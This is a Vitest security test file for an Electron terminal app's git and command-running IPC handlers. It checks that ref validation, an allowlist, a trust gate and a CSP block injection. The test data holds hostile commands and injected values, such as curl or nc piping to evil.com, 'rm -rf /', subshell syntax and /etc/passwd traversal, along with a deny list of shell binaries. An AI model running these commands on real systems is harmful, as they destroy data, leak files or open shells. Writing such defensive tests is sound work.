// Negative-path security tests.
//
// Unlike the mainProcess suite, which mocks safeGit so it can reuse existing
// execSync-style assertions, this suite exercises the *real* gitCommand
// module — we want to know that isValidGitRef and parseSafeCommand actually
// reject the malicious inputs they claim to reject, and that the IPC
// handlers in index.ts funnel those rejections back to the renderer as
// `{success:false, error:...}` before any exec ever happens.
//
// No test here shells out; execFileSync is mocked. If a test ever reaches
// the mock, that's a validation-bypass — the assertion against `success:
// false` will fail because the mock returns empty output and the handler
// reports success.

import { describe, it, expect, vi, beforeAll } from 'vitest'
import {
  isValidGitRef,
  parseSafeCommand,
  SAFE_RUNNERS,
} from '../../src/main/gitCommand'

// ---------------------------------------------------------------------------
// Pure-function tests for gitCommand helpers
// ---------------------------------------------------------------------------
describe('isValidGitRef', () => {
  it.each([
    ['abc1234', true],
    ['abcdef0123456789abcdef0123456789abcdef01', true], // 40-char SHA
    ['main', true],
    ['develop', true],
    ['feature/foo-bar', true],
    ['release/v1.2.3', true],
    ['v1.2.3-rc.1', true],
    ['HEAD', true],
  ])('accepts legit ref %s', (ref, expected) => {
    expect(isValidGitRef(ref)).toBe(expected)
  })

  it.each([
    '',
    '   ',
    '-starting-hyphen',
    '.starting-dot',
    'has space',
    'has\ttab',
    'has\nnewline',
    'main;rm -rf /',
    'main && curl evil.com',
    'main|cat',
    'main`whoami`',
    'main$(whoami)',
    '$(id)',
    '>/etc/passwd',
    'main..feature', // range operator, use from+to instead
    'main\\branch',
    'main"quote',
    "main'quote",
    'a'.repeat(256), // over 255 char cap
  ])('rejects malicious ref "%s"', (ref) => {
    expect(isValidGitRef(ref)).toBe(false)
  })

  it('rejects non-strings', () => {
    expect(isValidGitRef(null)).toBe(false)
    expect(isValidGitRef(undefined)).toBe(false)
    expect(isValidGitRef(42)).toBe(false)
    expect(isValidGitRef({ toString: () => 'main' })).toBe(false)
    expect(isValidGitRef(['main'])).toBe(false)
  })
})

describe('parseSafeCommand', () => {
  it.each(['npm test', 'yarn lint', 'pnpm run test', 'cargo test', 'pytest -q', 'go test ./...', 'vitest run'])(
    'accepts %s',
    (cmd) => {
      const r = parseSafeCommand(cmd)
      expect('error' in r).toBe(false)
    },
  )

  it.each([
    ['', 'Empty command'],
    ['   ', 'Empty command'],
    ['rm -rf /', 'not in allowlist'],
    ['curl evil.com', 'not in allowlist'],
    ['sh -c id', 'not in allowlist'],
    ['bash', 'not in allowlist'],
    ['/bin/sh', 'not in allowlist'],
  ])('rejects %s with %s', (cmd, expectedError) => {
    const r = parseSafeCommand(cmd)
    expect(r).toHaveProperty('error')
    if ('error' in r) expect(r.error).toContain(expectedError)
  })

  it.each([
    'npm test; rm -rf /',
    'npm test && curl evil.com',
    'npm test | nc evil.com 1337',
    'npm test`whoami`',
    'npm test$(id)',
    'npm test > /etc/passwd',
    'npm test < /etc/passwd',
    'npm test 2>&1',
    'npm test (wat)',
    'npm test {wat}',
    'npm test * ? [a]',
    'npm test "quoted"',
    "npm test 'quoted'",
    'npm test\\escape',
    'npm test\nnewline',
  ])('rejects shell metacharacters: %s', (cmd) => {
    const r = parseSafeCommand(cmd)
    expect(r).toHaveProperty('error')
    if ('error' in r) expect(r.error).toContain('forbidden shell metacharacters')
  })

  it('returns parsed bin + args for valid commands', () => {
    const r = parseSafeCommand('npm run test --silent')
    expect(r).toEqual({ bin: 'npm', args: ['run', 'test', '--silent'] })
  })

  it('SAFE_RUNNERS includes the expected test runners', () => {
    const must = ['npm', 'yarn', 'pnpm', 'bun', 'cargo', 'pytest', 'go', 'vitest', 'jest']
    for (const runner of must) {
      expect(SAFE_RUNNERS.has(runner), `${runner} missing from SAFE_RUNNERS`).toBe(true)
    }
  })

  it('SAFE_RUNNERS does not include shell-ish binaries', () => {
    const never = ['sh', 'bash', 'zsh', 'cmd', 'powershell', 'pwsh', 'ruby-shell', 'eval']
    for (const runner of never) {
      expect(SAFE_RUNNERS.has(runner), `${runner} should not be in SAFE_RUNNERS`).toBe(false)
    }
  })
})

// ---------------------------------------------------------------------------
// IPC handler integration — verify malicious inputs are rejected before
// ever reaching execFileSync. The handler contract we assert is: if input
// fails validation, execFileSync is never called and the response is
// {success:false, error:...}.
// ---------------------------------------------------------------------------
const ipcHandlers = new Map<string, Function>()
const mockWebContents = { send: vi.fn(), executeJavaScript: vi.fn() }
const mockMainWindow = {
  minimize: vi.fn(), maximize: vi.fn(), unmaximize: vi.fn(),
  isMaximized: vi.fn(), isMinimized: vi.fn(() => false),
  restore: vi.fn(), focus: vi.fn(), close: vi.fn(), on: vi.fn(),
  loadURL: vi.fn(), loadFile: vi.fn(), webContents: mockWebContents,
}
function MockBrowserWindow() { return mockMainWindow }
MockBrowserWindow.prototype = {}

vi.mock('electron', () => ({
  app: {
    getPath: vi.fn(() => require('os').tmpdir()),
    whenReady: () => Promise.resolve(),
    requestSingleInstanceLock: () => true,
    setName: vi.fn(),
    on: vi.fn(),
    commandLine: { appendSwitch: vi.fn() },
    isPackaged: false,
    quit: vi.fn(),
  },
  ipcMain: {
    handle: vi.fn((channel: string, handler: Function) => {
      ipcHandlers.set(channel, handler)
    }),
    on: vi.fn(),
  },
  BrowserWindow: MockBrowserWindow,
  dialog: {
    showSaveDialog: vi.fn(),
    showOpenDialog: vi.fn(),
    showMessageBox: vi.fn(async () => ({ response: 0, checkboxChecked: false })),
  },
  Menu: { setApplicationMenu: vi.fn() },
  nativeImage: { createFromPath: vi.fn(() => ({})) },
  globalShortcut: { register: vi.fn(), unregisterAll: vi.fn() },
  shell: { openExternal: vi.fn() },
  safeStorage: {
    isEncryptionAvailable: () => false,
    encryptString: (s: string) => Buffer.from(s, 'utf8'),
    decryptString: (b: Buffer) => b.toString('utf8'),
  },
}))

vi.mock('../../src/main/sentry', () => ({ initMainSentry: vi.fn() }))
vi.mock('../../src/main/terminalManager', () => ({
  spawnTerminal: vi.fn(), killTerminal: vi.fn(), writeToTerminal: vi.fn(),
  resizeTerminal: vi.fn(), killAll: vi.fn(), getTerminalCwd: vi.fn(),
}))
vi.mock('../../src/main/sessionStore', () => ({ loadSession: vi.fn(() => null), saveSession: vi.fn() }))
vi.mock('../../src/main/historyStore', () => ({ appendCommand: vi.fn(), searchHistory: vi.fn(() => []) }))
vi.mock('../../src/main/configFileManager', () => ({ readConfigFile: vi.fn(), writeConfigFile: vi.fn() }))
vi.mock('../../src/main/completionService', () => ({
  listPathEntries: vi.fn(() => []), listPathCommands: vi.fn(() => []), listEnvVars: vi.fn(() => []),
}))
vi.mock('../../src/main/shellDetector', () => ({ detectAvailableShells: vi.fn(async () => []) }))
vi.mock('../../src/main/mcpServer', () => ({
  startMcpServer: vi.fn(), stopMcpServer: vi.fn(),
  getMcpAuthToken: vi.fn(() => 'fake-token'), getMcpPort: vi.fn(() => 9315),
  initAuditLog: vi.fn(),
  awaitMcpPortBound: vi.fn(() => Promise.resolve(9315)),
}))
vi.mock('../../src/main/swarmManager', () => ({
  sendMessage: vi.fn(), readMessages: vi.fn(() => []), getAllMessages: vi.fn(() => []),
  createTask: vi.fn(), listTasks: vi.fn(() => []), updateTask: vi.fn(), clearSwarm: vi.fn(),
}))
vi.mock('../../src/main/agentEventBus', () => ({
  initEventBus: vi.fn(), query: vi.fn(() => []), subscribe: vi.fn(),
  getRingSize: vi.fn(() => 0), getDroppedCount: vi.fn(() => 0), shutdownEventBus: vi.fn(),
}))
vi.mock('../../src/main/transcriptWatchers', () => ({
  attachWatcher: vi.fn(), detachWatchers: vi.fn(), detachAll: vi.fn(),
}))
vi.mock('../../src/main/contextPinStore', () => ({
  initContextPinStore: vi.fn(),
  listPins: vi.fn(() => []), addPin: vi.fn(), removePin: vi.fn(),
  updatePin: vi.fn(), clearPins: vi.fn(),
}))
vi.mock('../../src/main/swarmMemory', () => ({
  initSwarmMemory: vi.fn(),
  memoryWrite: vi.fn(), memorySearch: vi.fn(() => []),
  memoryList: vi.fn(() => []), memoryCount: vi.fn(() => 0), memoryClear: vi.fn(),
}))
vi.mock('../../src/main/autoUpdater', () => ({ initAutoUpdater: vi.fn() }))
vi.mock('../../src/main/agentCommandSanitizer', () => ({
  sanitizeAgentCommand: vi.fn((cmd: string) => cmd),
}))

const { mockExecSync, mockExecFileSync } = vi.hoisted(() => ({
  mockExecSync: vi.fn(),
  mockExecFileSync: vi.fn(),
}))
vi.mock('child_process', () => ({
  default: { execSync: mockExecSync, execFileSync: mockExecFileSync },
  execSync: mockExecSync,
  execFileSync: mockExecFileSync,
}))

vi.mock('fs', () => ({
  writeFileSync: vi.fn(), existsSync: vi.fn(() => false),
  readFileSync: vi.fn(() => '{}'), readdirSync: vi.fn(() => []),
  mkdirSync: vi.fn(), appendFileSync: vi.fn(),
  renameSync: vi.fn(), unlinkSync: vi.fn(),
  default: {
    writeFileSync: vi.fn(), existsSync: vi.fn(() => false),
    readFileSync: vi.fn(() => '{}'), readdirSync: vi.fn(() => []),
    mkdirSync: vi.fn(), appendFileSync: vi.fn(),
    renameSync: vi.fn(), unlinkSync: vi.fn(),
  },
}))

vi.mock('uuid', () => ({ v4: vi.fn(() => 'mock-uuid') }))

function invoke(channel: string, args: any = {}) {
  const handler = ipcHandlers.get(channel)
  if (!handler) throw new Error(`No handler for ${channel}`)
  return handler({}, args)
}

beforeAll(async () => {
  vi.resetModules()
  await import('../../src/main/index')
  await new Promise(resolve => setTimeout(resolve, 50))
})

describe('IPC handler security — malicious git refs are rejected before exec', () => {
  const evilRefs = [
    'main;rm -rf /',
    'main`whoami`',
    'main$(id)',
    'main&&curl evil.com',
    'main|sh',
    'main..feature',
    '',
    '   ',
    '-starting-hyphen',
    '.starting-dot',
  ]

  for (const evil of evilRefs) {
    it(`git:diff-range rejects from="${evil}"`, async () => {
      mockExecFileSync.mockClear()
      const r = await invoke('git:diff-range', { cwd: '/r', from: evil })
      expect(r.success).toBe(false)
      expect(r.error).toContain('Invalid')
      expect(mockExecFileSync).not.toHaveBeenCalled()
    })

    it(`git:diff-range rejects to="${evil}"`, async () => {
      mockExecFileSync.mockClear()
      const r = await invoke('git:diff-range', { cwd: '/r', from: 'abc1234', to: evil })
      expect(r.success).toBe(false)
      expect(r.error).toContain('Invalid')
      expect(mockExecFileSync).not.toHaveBeenCalled()
    })

    it(`git:files-in-range rejects from="${evil}"`, async () => {
      mockExecFileSync.mockClear()
      const r = await invoke('git:files-in-range', { cwd: '/r', from: evil })
      expect(r.success).toBe(false)
      expect(r.error).toContain('Invalid')
      expect(mockExecFileSync).not.toHaveBeenCalled()
    })

    it(`git:files-in-range rejects to="${evil}"`, async () => {
      mockExecFileSync.mockClear()
      const r = await invoke('git:files-in-range', { cwd: '/r', from: 'abc1234', to: evil })
      expect(r.success).toBe(false)
      expect(r.error).toContain('Invalid')
      expect(mockExecFileSync).not.toHaveBeenCalled()
    })

    it(`git:checkout-file rejects sha="${evil}"`, async () => {
      mockExecFileSync.mockClear()
      const r = await invoke('git:checkout-file', { cwd: '/r', sha: evil, files: ['x'] })
      expect(r.success).toBe(false)
      expect(r.error).toContain('Invalid SHA')
      expect(mockExecFileSync).not.toHaveBeenCalled()
    })
  }
})

describe('IPC handler security — malicious file names never hit a shell', () => {
  // Because git handlers use argv form, these inputs reach git as literal
  // argv entries. git itself rejects non-existent pathspecs; what we care
  // about is that the shell never sees them.
  const evilFiles = [
    ['file;rm -rf ~', 'should pass as argv and git treats as literal path'],
    ['"quoted.ts"', 'literal quotes in name'],
    ['$(whoami).ts', 'subshell syntax'],
    ['`id`.ts', 'backtick syntax'],
    ['file with spaces.ts', 'spaces'],
    ['../../../etc/passwd', 'path traversal'],
    ['file|cat /etc/passwd', 'pipe'],
    ['file&&curl evil', 'chain'],
  ]

  for (const [evil, desc] of evilFiles) {
    it(`git:stage passes "${evil}" as literal argv (${desc})`, async () => {
      mockExecFileSync.mockClear()
      mockExecFileSync.mockReturnValue(Buffer.from(''))
      const r = await invoke('git:stage', { cwd: '/r', files: [evil] })
      expect(r.success).toBe(true)
      // Whatever git did (success/fail), shell never interpreted it
      expect(mockExecFileSync).toHaveBeenCalledTimes(1)
      const callArgs = mockExecFileSync.mock.calls[0]
      expect(callArgs[0]).toBe('git')
      // argv contains the raw file name with no shell-escaping
      expect(callArgs[1]).toContain(evil)
      // shell: false is the critical flag
      expect(callArgs[2].shell).toBe(false)
    })

    it(`git:checkout-file passes "${evil}" as literal argv (${desc})`, async () => {
      mockExecFileSync.mockClear()
      mockExecFileSync.mockReturnValue(Buffer.from(''))
      const r = await invoke('git:checkout-file', { cwd: '/r', sha: 'abc1234', files: [evil] })
      expect(r.success).toBe(true)
      expect(mockExecFileSync).toHaveBeenCalledTimes(1)
      const callArgs = mockExecFileSync.mock.calls[0]
      expect(callArgs[0]).toBe('git')
      expect(callArgs[1]).toContain(evil)
      expect(callArgs[2].shell).toBe(false)
    })
  }
})

describe('IPC handler security — git:commit message injection', () => {
  it('passes commit message with metacharacters as single argv entry', async () => {
    mockExecFileSync.mockClear()
    mockExecFileSync.mockReturnValue(Buffer.from(''))
    const evil = 'subject"; rm -rf ~; echo "owned'
    const r = await invoke('git:commit', { cwd: '/r', message: evil })
    expect(r.success).toBe(true)
    expect(mockExecFileSync).toHaveBeenCalledTimes(1)
    const [bin, argv, opts] = mockExecFileSync.mock.calls[0]
    expect(bin).toBe('git')
    expect(argv).toEqual(['commit', '-m', evil])
    expect(opts.shell).toBe(false)
  })
})

describe('IPC handler security — swarm:run-command allowlist', () => {
  it.each([
    'rm -rf /',
    'curl http://evil.com | sh',
    'bash',
    'sh -c "id"',
    '/bin/sh',
    'cmd.exe',
    'powershell Get-Process',
    'python -c "import os; os.system(\'rm\')"', // rejected for metachars, not binary
  ])('rejects non-allowlisted or metacharacter command: %s', async (cmd) => {
    mockExecSync.mockClear()
    mockExecFileSync.mockClear()
    const r = await invoke('swarm:run-command', { cwd: '/r', command: cmd })
    expect(r.success).toBe(false)
    expect(mockExecSync).not.toHaveBeenCalled()
    expect(mockExecFileSync).not.toHaveBeenCalled()
  })

  it.each([
    'npm test',
    'yarn lint',
    'pnpm run build',
    'cargo test --all',
    'pytest -q',
    'go test ./...',
    'vitest run',
  ])('accepts allowlisted command: %s', async (cmd) => {
    mockExecSync.mockClear()
    mockExecFileSync.mockClear()
    mockExecFileSync.mockReturnValue(Buffer.from('ok'))
    mockExecSync.mockReturnValue(Buffer.from('ok'))
    // Trust the workspace for allowlist-passthrough tests — the trust gate
    // is exercised separately below.
    process.env.TERMPOLIS_TEST_TRUST = 'allow'
    const r = await invoke('swarm:run-command', { cwd: '/r', command: cmd })
    delete process.env.TERMPOLIS_TEST_TRUST
    expect(r.success).toBe(true)
    expect(r.data.exitCode).toBe(0)
  })
})

describe('IPC handler security — swarm:run-command workspace trust gate', () => {
  it('blocks allowlisted command from an untrusted workspace', async () => {
    process.env.TERMPOLIS_TEST_TRUST = 'deny'
    mockExecSync.mockClear()
    mockExecFileSync.mockClear()
    const r = await invoke('swarm:run-command', { cwd: '/untrusted', command: 'npm test' })
    delete process.env.TERMPOLIS_TEST_TRUST
    expect(r.success).toBe(false)
    expect(r.error).toContain('Workspace not trusted')
    expect(mockExecSync).not.toHaveBeenCalled()
    expect(mockExecFileSync).not.toHaveBeenCalled()
  })

  it('allows command when workspace is explicitly trusted via IPC', async () => {
    mockExecSync.mockClear()
    mockExecFileSync.mockClear()
    mockExecFileSync.mockReturnValue(Buffer.from('ok'))
    mockExecSync.mockReturnValue(Buffer.from('ok'))
    // Explicit trust via IPC — no dialog needed
    const trustResp = await invoke('workspace:trust', { cwd: '/trusted-repo' })
    expect(trustResp.success).toBe(true)
    // Verify it shows up in list
    const listResp = await invoke('workspace:list-trusted', {})
    expect(listResp.data.some((p: string) => p.includes('trusted-repo'))).toBe(true)
    const r = await invoke('swarm:run-command', { cwd: '/trusted-repo', command: 'npm test' })
    expect(r.success).toBe(true)
  })

  it('revoke-trust removes a previously trusted folder', async () => {
    await invoke('workspace:trust', { cwd: '/tmp-trust' })
    expect((await invoke('workspace:is-trusted', { cwd: '/tmp-trust' })).data).toBe(true)
    await invoke('workspace:revoke-trust', { cwd: '/tmp-trust' })
    expect((await invoke('workspace:is-trusted', { cwd: '/tmp-trust' })).data).toBe(false)
  })
})

describe('IPC handler security — git:reset-hard SHA gate still intact', () => {
  it.each([
    '',
    'abc', // too short
    'zzzzzzz', // non-hex
    'abc1234; rm -rf /',
    'a'.repeat(41), // too long
  ])('rejects sha="%s"', async (sha) => {
    mockExecFileSync.mockClear()
    const r = await invoke('git:reset-hard', { cwd: '/r', sha })
    expect(r.success).toBe(false)
    expect(r.error).toBe('Invalid SHA')
    expect(mockExecFileSync).not.toHaveBeenCalled()
  })
})

describe('CSP is present in renderer index.html', () => {
  it('index.html declares a Content-Security-Policy meta tag', async () => {
    const fs = await vi.importActual<typeof import('fs')>('fs')
    const path = await vi.importActual<typeof import('path')>('path')
    const html = fs.readFileSync(
      path.join(process.cwd(), 'src', 'renderer', 'index.html'),
      'utf8',
    )
    expect(html).toMatch(/Content-Security-Policy/i)
    // Strict script-src: 'self' plus ONLY 'wasm-unsafe-eval' (lets the voice
    // worker compile onnxruntime-web WASM — WASM compilation only, not JS eval).
    // Bare 'unsafe-eval' (arbitrary JS) and 'unsafe-inline' remain forbidden.
    const scriptSrc = html.match(/script-src([^;]*);/)?.[1] ?? ''
    expect(scriptSrc).toContain("'self'")
    expect(scriptSrc).not.toContain("'unsafe-inline'")
    expect(scriptSrc.replace(/'wasm-unsafe-eval'/g, '')).not.toContain('unsafe-eval')
    // Blocks inline object/embed (Flash-era attack vectors)
    expect(html).toMatch(/object-src\s+'none'/)
    // Prevents <base> injection hijacking relative URLs
    expect(html).toMatch(/base-uri\s+'self'/)
  })
})
